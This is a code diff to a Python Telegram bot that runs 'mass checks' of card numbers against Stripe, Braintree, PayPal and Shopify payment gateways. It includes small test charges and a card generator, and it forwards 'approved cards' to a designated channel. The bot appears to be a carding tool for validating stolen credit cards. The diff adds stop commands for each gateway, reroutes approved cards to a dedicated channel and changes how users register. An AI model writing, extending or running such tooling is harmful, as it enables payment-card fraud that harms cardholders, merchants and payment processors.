@@ -17,8 +17,21 @@ from payp import check_card_paypal
 from sh import check_card_shopify, check_cards_shopify
 import mysql.connector
 from mysql.connector import pooling
+
+# Global variables to control mass checking
+MASS_CHECK_ACTIVE = {
+    'mch': False,
+    'mbr': False, 
+    'mpp': False,
+    'msh': False,
+    'mst': False
+}
+
+APPROVED_CHANNEL_ID = "-1003290219349"  # Channel to forward approved cards
+
 initialize_braintree()
 PAYPAL_MAINTENANCE = False
+
 # Database connection pool
 db_pool = pooling.MySQLConnectionPool(
     pool_name="bot_pool",
@@ -52,7 +65,7 @@ def notify_admin(message):
 def notify_channel(message):
     """Send approved card to channel with length checking"""
     try:
-        send_long_message(CHANNEL_ID, message, parse_mode='HTML')
+        send_long_message(APPROVED_CHANNEL_ID, message, parse_mode='HTML')
     except Exception as e:
         print(f"Failed to send channel notification: {e}")
 
@@ -745,6 +758,67 @@ def save_authorized_groups(groups):
 
 def is_group_authorized(group_id):
     return group_id in load_authorized_groups()
+
+# ---------------- Stop Commands ---------------- #
+
+@bot.message_handler(commands=['stopch', 'stopbr', 'stoppp', 'stopsh', 'stopst'])
+def stop_mass_check(msg):
+    """Stop mass checking for all gateways"""
+    if not is_authorized(msg):
+        return send_long_message(msg.chat.id, """
+  
+🔰 AUTHORIZATION REQUIRED 🔰         
+
+• You are not authorized to use this command
+• Only authorized users can stop mass checks
+
+• Use /register to get access
+• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)
+
+    command = msg.text.split('@')[0].lower()
+    
+    stop_commands = {
+        '/stopch': 'mch',
+        '/stopbr': 'mbr', 
+        '/stoppp': 'mpp',
+        '/stopsh': 'msh',
+        '/stopst': 'mst'
+    }
+    
+    gateway_name = {
+        'mch': 'Stripe Auth',
+        'mbr': 'Braintree Auth',
+        'mpp': 'PayPal Charge', 
+        'msh': 'Shopify Charge',
+        'mst': 'Stripe Charge'
+    }
+    
+    gateway_key = stop_commands.get(command)
+    
+    if gateway_key:
+        MASS_CHECK_ACTIVE[gateway_key] = False
+        send_long_message(msg.chat.id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: {gateway_name[gateway_key]}
+• Status: Stopped ✅
+• All ongoing checks have been terminated
+
+• You can start a new mass check anytime""", reply_to_message_id=msg.message_id)
+    else:
+        send_long_message(msg.chat.id, """
+╔═══════════════════════╗
+     ❌ INVALID COMMAND ❌
+╚═══════════════════════╝
+
+• Available stop commands:
+• /stopch - Stop Stripe Auth
+• /stopbr - Stop Braintree Auth  
+• /stoppp - Stop PayPal Charge
+• /stopsh - Stop Shopify Charge
+• /stopst - Stop Stripe Charge""", reply_to_message_id=msg.message_id)
 
 # ---------------- Status Command ---------------- #
 
@@ -1655,6 +1729,7 @@ Error: {str(e)}
 Error: {str(e)}
 
 ✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
+
 # ---------------- Bot Commands ---------------- #
 
 @bot.message_handler(commands=['start'])
@@ -1662,12 +1737,9 @@ def start_handler(msg):
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     user_id = msg.from_user.id
     
-    # Auto-register user if not already registered
+    # Don't auto-register, tell user to register first
     if not is_authorized(msg) and msg.chat.type == "private":
-        if add_free_user(user_id, msg.from_user.first_name or "User"):
-            welcome_note = "\n✅ You have been automatically registered!"
-        else:
-            welcome_note = "\n❓ Use /register to get access"
+        welcome_note = "\n❓ Use /register to get access"
     else:
         welcome_note = ""
     
@@ -1686,7 +1758,7 @@ def start_handler(msg):
 │ • /pp     - PayPal Charge 2$✅
 │ • /mpp    - Mass PayPal 2$✅
 │ • /sh     - Shopify Charge 13.98$✅
-│ • /mpp    - Shopify Mass 13.98$✅
+│ • /msh    - Shopify Mass 13.98$✅
 │ • /gen    - Generate Cards 🎰
 ├───────────────────────┤
 │ 📓 𝗙𝗿𝗲𝗲 𝗧𝗶𝗲𝗿:
@@ -1699,6 +1771,7 @@ def start_handler(msg):
 │📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @mhitzxg 
 │❄️ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd
 └───────────────────────┘
+{welcome_note}
 """
     
     send_long_message(msg.chat.id, welcome_message, reply_to_message_id=msg.message_id)
@@ -1948,9 +2021,9 @@ Valid format:
             
             # Format the result with the new information
             formatted_result = result.replace(
-     "👤 Checked by: {user_info}\n🔌 Proxy: {proxy_status}\n🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
-     f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
-)
+                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
+                f"👤 Checked by: {user_info}\n🔌 Proxy: {proxy_status}\n🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
+            )
             
             edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
             
@@ -2086,6 +2159,9 @@ Valid format:
     # Determine where to send messages (group or private)
     chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id
 
+    # Set mass check as active
+    MASS_CHECK_ACTIVE['msh'] = True
+
     # Combined loading message with counter and status bar
     loading_msg = send_long_message(chat_id, f"""
 
@@ -2105,7 +2181,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ Status will update automatically""")
+⚡ Status will update automatically
+💡 Use /stopsh to stop mass check""")
     
     if isinstance(loading_msg, list) and len(loading_msg) > 0:
         loading_msg = loading_msg[0]
@@ -2132,7 +2209,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
+⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}
+💡 Use /stopsh to stop mass check"""
         
         try:
             edit_long_message(chat_id, message_id, loading_text)
@@ -2148,6 +2226,20 @@ Valid format:
         nonlocal approved, declined, checked, approved_cards, approved_message_id
         
         for i, cc in enumerate(cc_lines, 1):
+            # Check if mass check was stopped
+            if not MASS_CHECK_ACTIVE['msh']:
+                send_long_message(chat_id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: Shopify Charge
+• Cards Checked: {checked}/{total}
+• Approved: {approved} | Declined: {declined}
+
+• Mass check was stopped by user""")
+                break
+                
             try:
                 # Update combined loading animation
                 progress = int((i / len(cc_lines)) * 100)
@@ -2222,6 +2314,9 @@ Valid format:
                 time.sleep(1)  # Reduced sleep time for faster processing
             except Exception as e:
                 send_long_message(user_id, f"❌ Error: {e}")
+
+        # Reset mass check status
+        MASS_CHECK_ACTIVE['msh'] = False
 
         # Update stats after processing all cards
         update_stats(approved=approved, declined=declined)
@@ -2601,6 +2696,9 @@ Valid format:
     # Determine where to send messages (group or private)
     chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id
 
+    # Set mass check as active
+    MASS_CHECK_ACTIVE['mbr'] = True
+
     # Combined loading message with counter and status bar
     loading_msg = send_long_message(chat_id, f"""
 
@@ -2621,7 +2719,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ Status will update automatically""")
+⚡ Status will update automatically
+💡 Use /stopbr to stop mass check""")
     
     if isinstance(loading_msg, list) and len(loading_msg) > 0:
         loading_msg = loading_msg[0]
@@ -2649,7 +2748,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
+⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}
+💡 Use /stopbr to stop mass check"""
         
         try:
             edit_long_message(chat_id, message_id, loading_text)
@@ -2665,6 +2765,20 @@ Valid format:
         nonlocal approved, declined, checked, approved_cards, approved_message_id
         
         for i, cc in enumerate(cc_lines, 1):
+            # Check if mass check was stopped
+            if not MASS_CHECK_ACTIVE['mbr']:
+                send_long_message(chat_id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: Braintree Auth
+• Cards Checked: {checked}/{total}
+• Approved: {approved} | Declined: {declined}
+
+• Mass check was stopped by user""")
+                break
+                
             try:
                 # Update combined loading animation
                 progress = int((i / len(cc_lines)) * 100)
@@ -2749,6 +2863,9 @@ Valid format:
                 time.sleep(2)  # Braintree needs more time between requests
             except Exception as e:
                 send_long_message(user_id, f"❌ Error: {e}")
+
+        # Reset mass check status
+        MASS_CHECK_ACTIVE['mbr'] = False
 
         # Update stats after processing all cards
         update_stats(approved=approved, declined=declined)
@@ -3122,6 +3239,9 @@ Valid format:
     # Determine where to send messages (group or private)
     chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id
 
+    # Set mass check as active
+    MASS_CHECK_ACTIVE['mch'] = True
+
     # Combined loading message with counter and status bar
     loading_msg = send_long_message(chat_id, f"""
 
@@ -3142,7 +3262,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ Status will update automatically""")
+⚡ Status will update automatically
+💡 Use /stopch to stop mass check""")
     
     if isinstance(loading_msg, list) and len(loading_msg) > 0:
         loading_msg = loading_msg[0]
@@ -3170,7 +3291,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
+⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}
+💡 Use /stopch to stop mass check"""
         
         try:
             edit_long_message(chat_id, message_id, loading_text)
@@ -3186,6 +3308,20 @@ Valid format:
         nonlocal approved, declined, checked, approved_cards, approved_message_id
         
         for i, cc in enumerate(cc_lines, 1):
+            # Check if mass check was stopped
+            if not MASS_CHECK_ACTIVE['mch']:
+                send_long_message(chat_id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: Stripe Auth
+• Cards Checked: {checked}/{total}
+• Approved: {approved} | Declined: {declined}
+
+• Mass check was stopped by user""")
+                break
+                
             try:
                 # Update combined loading animation
                 progress = int((i / len(cc_lines)) * 100)
@@ -3260,6 +3396,9 @@ Valid format:
                 time.sleep(1)  # Reduced sleep time for faster processing
             except Exception as e:
                 send_long_message(user_id, f"❌ Error: {e}")
+
+        # Reset mass check status
+        MASS_CHECK_ACTIVE['mch'] = False
 
         # Update stats after processing all cards
         update_stats(approved=approved, declined=declined)
@@ -3632,6 +3771,9 @@ Valid format:
     # Determine where to send messages (group or private)
     chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id
 
+    # Set mass check as active
+    MASS_CHECK_ACTIVE['mst'] = True
+
     # Combined loading message with counter and status bar
     loading_msg = send_long_message(chat_id, f"""
 
@@ -3652,7 +3794,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ Status will update automatically""")
+⚡ Status will update automatically
+💡 Use /stopst to stop mass check""")
     
     if isinstance(loading_msg, list) and len(loading_msg) > 0:
         loading_msg = loading_msg[0]
@@ -3680,7 +3823,8 @@ Valid format:
 • Mass check in progress...
 • Please wait, this may take some time
 
-⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
+⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}
+💡 Use /stopst to stop mass check"""
         
         try:
             edit_long_message(chat_id, message_id, loading_text)
@@ -3701,6 +3845,20 @@ Valid format:
         try:
             # Process each card individually with progress updates
             for i, cc_line in enumerate(cc_lines, 1):
+                # Check if mass check was stopped
+                if not MASS_CHECK_ACTIVE['mst']:
+                    send_long_message(chat_id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: Stripe Charge
+• Cards Checked: {checked}/{total}
+• Approved: {approved} | Declined: {declined}
+
+• Mass check was stopped by user""")
+                    break
+                    
                 current = i
                 checked = current
                 
@@ -3775,6 +3933,9 @@ Valid format:
                 # Add delay between cards (except for the last one)
                 if i < len(cc_lines):
                     time.sleep(random.uniform(2, 4))
+
+            # Reset mass check status
+            MASS_CHECK_ACTIVE['mst'] = False
 
             # Update stats after processing all cards
             update_stats(approved=approved, declined=declined)
@@ -4184,6 +4345,9 @@ Valid format:
     # Determine where to send messages (group or private)
     chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id
 
+    # Set mass check as active
+    MASS_CHECK_ACTIVE['mpp'] = True
+
     # Combined loading message with counter and status bar
     loading_msg = send_long_message(chat_id, f"""
 
@@ -4204,7 +4368,8 @@ Valid format:
 • PayPal mass check in progress...
 • Please wait, this may take some time
 
-⚡ Status will update automatically""")
+⚡ Status will update automatically
+💡 Use /stoppp to stop mass check""")
     
     if isinstance(loading_msg, list) and len(loading_msg) > 0:
         loading_msg = loading_msg[0]
@@ -4232,7 +4397,8 @@ Valid format:
 • PayPal mass check in progress...
 • Please wait, this may take some time
 
-⚡ {random.choice(['Validating cards...', 'Processing PayPal...', 'Checking limits...', 'Contacting gateway...'])}"""
+⚡ {random.choice(['Validating cards...', 'Processing PayPal...', 'Checking limits...', 'Contacting gateway...'])}
+💡 Use /stoppp to stop mass check"""
         
         try:
             edit_long_message(chat_id, message_id, loading_text)
@@ -4248,6 +4414,20 @@ Valid format:
         nonlocal approved, declined, checked, approved_cards, approved_message_id
         
         for i, cc in enumerate(cc_lines, 1):
+            # Check if mass check was stopped
+            if not MASS_CHECK_ACTIVE['mpp']:
+                send_long_message(chat_id, f"""
+╔═══════════════════════╗
+     ⏹️ MASS CHECK STOPPED ⏹️
+╚═══════════════════════╝
+
+• Gateway: PayPal Charge
+• Cards Checked: {checked}/{total}
+• Approved: {approved} | Declined: {declined}
+
+• Mass check was stopped by user""")
+                break
+                
             try:
                 # Update combined loading animation
                 progress = int((i / len(cc_lines)) * 100)
@@ -4318,6 +4498,9 @@ Valid format:
                 time.sleep(1)  # Reduced sleep time for faster processing
             except Exception as e:
                 send_long_message(user_id, f"❌ Error: {e}")
+
+        # Reset mass check status
+        MASS_CHECK_ACTIVE['mpp'] = False
 
         # Update stats after processing all cards
         update_stats(approved=approved, declined=declined)
